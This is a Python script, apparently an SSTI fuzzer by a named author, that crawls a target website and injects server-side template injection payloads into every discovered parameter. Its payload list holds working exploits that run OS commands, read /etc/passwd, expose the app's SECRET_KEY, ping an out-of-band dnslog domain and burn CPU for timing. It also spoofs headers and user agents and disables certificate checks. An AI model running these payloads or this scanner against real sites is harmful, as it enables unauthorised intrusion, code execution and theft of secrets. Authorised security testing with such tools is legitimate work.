#!/usr/bin/env python3
# ════════════════════════════════════════════════════════════════════════════
# SSTI AI Fuzzer (v1.2‑dev, 2025‑04‑21)
# Author : Haroon Ahmad Awan · CyberZeus <haroon@cyberzeus.pk>
# ════════════════════════════════════════════════════════════════════════════
import os, re, sys, ssl, time, json, random, string, logging, warnings, argparse, asyncio
import urllib.parse, requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
# ─────────────────────────────────────────────────────────────────────────────
USE_CODEBERT = False
try:
    from transformers import AutoTokenizer, AutoModelForMaskedLM
    TOKENIZER  = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    MODEL      = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
    MODEL.eval(); USE_CODEBERT = True
except Exception as e:
    logging.warning(f"[AI] CodeBERT unavailable → {e}")

HAVE_PLAYWRIGHT = False
try:
    from playwright.sync_api import sync_playwright
    HAVE_PLAYWRIGHT = True
except Exception as e:
    logging.warning(f"[dyn] Playwright unavailable → {e}")

VERSION         = "1.2‑dev"
DNSLOG_DOMAIN   = f"ssti{random.randint(1000,9999)}.dnslog.cn"
LOGFILE         = Path("ssti_results.md")
TIMEOUT_REQ     = 6
MAX_PAGES       = 160
DEFAULT_THREADS = 18
JITTER_DELAY    = (0.25, 0.9)
RAND            = ''.join(random.choices(string.ascii_lowercase, k=5))
MARK            = f"cyz{RAND}"
A,B             = random.randint(6,9), random.randint(11,14)
PRODUCT         = str(A*B)

# ── CLI ──────────────────────────────────────────────────────────────────────
PARSER = argparse.ArgumentParser()
PARSER.add_argument("-u","--url", required=True, help="Target root URL")
PARSER.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="fuzz threads")
PARSER.add_argument("--max-pages", type=int, default=MAX_PAGES, help="crawl cap")
PARSER.add_argument("--no-browser", action="store_true", help="skip Playwright crawl")
PARSER.add_argument("--debug", action="store_true")
ARGS   = PARSER.parse_args()
logging.basicConfig(level=logging.DEBUG if ARGS.debug else logging.INFO,
                    format="%(levelname)s | %(message)s")
warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

# ════════════════════════════════════════════════════════════════════════════
# 1.  Payload factory
# ════════════════════════════════════════════════════════════════════════════
CORES = [
    f"{{{{'{MARK}'}}}}", f"{{{{ '{MARK}' |safe}}}}",
    f"{{{{{A}*{B}}}}}",
    f"${{{{'{MARK}'}}}}", f"${{{A}*{B}}}",
    f"<%= '{MARK}' %>", f"<%%= {A}*{B} %%>",
    f"<!--#echo var=\"{MARK}\"-->",
    f"<!--#exec cmd=\"/bin/echo {MARK}\"-->",
    f"{{{{ printf \"{MARK}\" }}}}", f"{{{{ \"{MARK}\" }}}}",
    "${{new java.lang.ProcessBuilder('ping','-c','1','%s').start()}}" % DNSLOG_DOMAIN,
    f"{{{{ self.__init__.__globals__.os.popen('echo {MARK}').read() }}}}",
    f"{{{{ request.application.__globals__.os.system('echo {MARK}') }}}}",
    f"{{{{ ''.__class__.__mro__[2].__subclasses__()[40]('{MARK}') }}}}",
    f"{{{{ config.items()[0][1].SECRET_KEY|attr('upper') }}}}",
    f"{{{{ cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()[:10] }}}}",
    f"{{{{ ''.__class__.__mro__[1].__subclasses__()[434]('/bin/ping -c1 {DNSLOG_DOMAIN}',shell=True) }}}}",
    # timing‑only / blind
    f"{{% for i in range(0,{A*100000000}) %}}{{% endfor %}}",
    "${{T(java.lang.Thread).sleep(10000)}}"
]

def hexify(s):   return ''.join(f"\\x{ord(c):02x}" for c in s)
def url1(s):     return urllib.parse.quote_plus(s, safe='')
def url2(s):     return urllib.parse.quote_plus(url1(s), safe='')
def nullbyte(s): return s+"%00"

def mutate(core:str):
    yield core
    yield url1(core); yield url2(core); yield hexify(core); yield nullbyte(core)
    yield f"<!--{core}-->"
    if MARK in core and "{{" in core:
        l,r = MARK[:len(MARK)//2], MARK[len(MARK)//2:]
        yield core.replace(MARK, f"'{l}'~'{r}'")
    if "${" in core and MARK in core:
        yield core.replace(MARK, f"'{MARK}'.toString()")
    if core.startswith("<!--#"):
        yield url1(core)

def ai_extend(base:str, top=2):
    if not USE_CODEBERT or MARK not in base: return []
    masked = base.replace(MARK, f"{MARK}{{MASK}}")
    ids    = TOKENIZER.encode(masked, return_tensors="pt")
    mi     = (ids == TOKENIZER.mask_token_id).nonzero(as_tuple=True)[1]
    preds  = MODEL(ids).logits[0, mi].topk(top).indices[0]
    return [masked.replace("{MASK}", TOKENIZER.decode([t]).strip()) for t in preds]

def build_payloads():
    pl=set()
    for c in CORES:
        for v in mutate(c): pl.add(v)
        for extra in ai_extend(c): 
            for v in mutate(extra): pl.add(v)
    lst=list(pl); random.shuffle(lst)
    return lst[:150]

PAYLOADS = build_payloads()

# ════════════════════════════════════════════════════════════════════════════
# 2.  Helpers
# ════════════════════════════════════════════════════════════════════════════
def smart_url(u):
    if u.startswith("http"): return u
    try:
        if requests.head("https://"+u, timeout=5).ok: return "https://"+u
    except: pass
    return "http://"+u

def rand_headers():
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
        "Accept": "*/*",
        "Referer": random.choice(["https://google.com","https://bing.com"]),
        "Origin": random.choice(["https://localhost","https://127.0.0.1"])
    }

def log_hit(url,param,payload,mode):
    entry = f"- **{mode}‑SSTI** `{url}` • **{param}** → `{payload}`\n"
    with LOGFILE.open("a",encoding="utf-8") as f: f.write(entry)
    logging.info(entry.strip())

# ════════════════════════════════════════════════════════════════════════════
# 3‑A  Static crawler  (BeautifulSoup)
# ════════════════════════════════════════════════════════════════════════════
def crawl_static(root, cap):
    seen,queue,out=set(),[root],[]
    dom=urllib.parse.urlparse(root).netloc
    while queue and len(seen)<cap:
        url=queue.pop(0)
        if url in seen: continue
        seen.add(url)
        try:
            r=requests.get(url,headers=rand_headers(),timeout=TIMEOUT_REQ)
            ctype=r.headers.get("Content-Type","")
            if "text/html" not in ctype and "application/json" not in ctype: continue
            soup=BeautifulSoup(r.text,"html.parser")

            # Links
            for a in soup.find_all("a",href=True):
                full=urllib.parse.urljoin(url,a["href"])
                if urllib.parse.urlparse(full).netloc==dom:
                    queue.append(full)
                    if "?" in full:
                        p=list(urllib.parse.parse_qs(urllib.parse.urlparse(full).query))
                        if p: out.append({"url":full.split("?")[0],"method":"GET","params":p})

            # Forms
            for f in soup.find_all("form"):
                act=f.get("action") or url
                full=urllib.parse.urljoin(url,act)
                m=f.get("method","GET").upper()
                names=[i.get("name") for i in f.find_all(["input","select","textarea"],{"name":True})]
                if names: out.append({"url":full,"method":m,"params":names})

            # JS bundle scraping (fetch/XHR/GraphQL)
            for s in soup.find_all("script", src=False):
                for m in re.findall(r"""['"](https?[^'"\\]+)['"]""", s.string or ""):
                    if urllib.parse.urlparse(m).netloc==dom and "?" in m:
                        p=list(urllib.parse.parse_qs(urllib.parse.urlparse(m).query))
                        if p: out.append({"url":m.split("?")[0],"method":"GET","params":p})
        except Exception as e:
            if ARGS.debug: logging.debug(e)
    return out

# ════════════════════════════════════════════════════════════════════════════
# 3‑B  Dynamic crawler  (Playwright)
# ════════════════════════════════════════════════════════════════════════════
def crawl_dynamic(root, cap):
    if not HAVE_PLAYWRIGHT or ARGS.no_browser: return []
    out=set()
    dom=urllib.parse.urlparse(root).netloc
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page    = browser.new_page()
            page.set_default_navigation_timeout(TIMEOUT_REQ*1000)
            def on_req(r):
                try:
                    u=r.url
                    if urllib.parse.urlparse(u).netloc==dom and "?" in u:
                        pnames=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                        if pnames:
                            out.add(json.dumps({"url":u.split("?")[0],"method":"GET","params":pnames}))
                except: pass
            page.on("request", on_req)
            page.goto(root, wait_until="networkidle")
            # SPA routers: click discovered anchors
            anchors = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
            for a in anchors[:cap]:
                try:
                    page.goto(a, wait_until="networkidle")
                except: pass
            browser.close()
    except Exception as e:
        if ARGS.debug: logging.debug(e)
    return [json.loads(i) for i in list(out)][:cap]

# ════════════════════════════════════════════════════════════════════════════
# 4.  SSTI fuzzer
# ════════════════════════════════════════════════════════════════════════════
def fuzz(tgt):
    url,method,params = tgt["url"], tgt["method"], tgt["params"]
    for p in params:
        for pay in PAYLOADS:
            data={k:pay if k==p else "test" for k in params}
            try:
                if method=="GET":
                    r=requests.get(url,params=data,headers=rand_headers(),timeout=TIMEOUT_REQ)
                else:
                    r=requests.post(url,data=data,headers=rand_headers(),timeout=TIMEOUT_REQ)
                time.sleep(random.uniform(*JITTER_DELAY))
                body=r.text

                if MARK in body or PRODUCT in body:
                    log_hit(url,p,pay,"REFLECT"); break
                if DNSLOG_DOMAIN in body:
                    log_hit(url,p,pay,"OOB"); break
            except Exception as e:
                if ARGS.debug: logging.debug(e)

# ════════════════════════════════════════════════════════════════════════════
def main():
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# SSTI Findings v{VERSION}\n\n")

    root=smart_url(ARGS.url.rstrip("/"))
    logging.info(f"[*] Target: {root}   •   Marker: {MARK}   •   DNSLog: {DNSLOG_DOMAIN}")

    tgts = crawl_static(root, ARGS.max_pages)
    logging.info(f"[+] Static crawl: {len(tgts)} endpoints")

    dyn  = crawl_dynamic(root, ARGS.max_pages)
    if dyn:
        logging.info(f"[+] Dynamic crawl: {len(dyn)} endpoints")
        tgts.extend(dyn)

    # dedupe endpoints by (url,method)
    uniq={}
    for t in tgts:
        key=(t["url"], t["method"])
        uniq.setdefault(key,set()).update(t["params"])
    merged=[{"url":k[0],"method":k[1],"params":sorted(v)} for k,v in uniq.items()]
    logging.info(f"[+] Total unique endpoints: {len(merged)}")

    with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
        pool.map(fuzz, merged)

    logging.info(f"[✓] Scan done → {LOGFILE.resolve()}")

if __name__=="__main__":
    main()
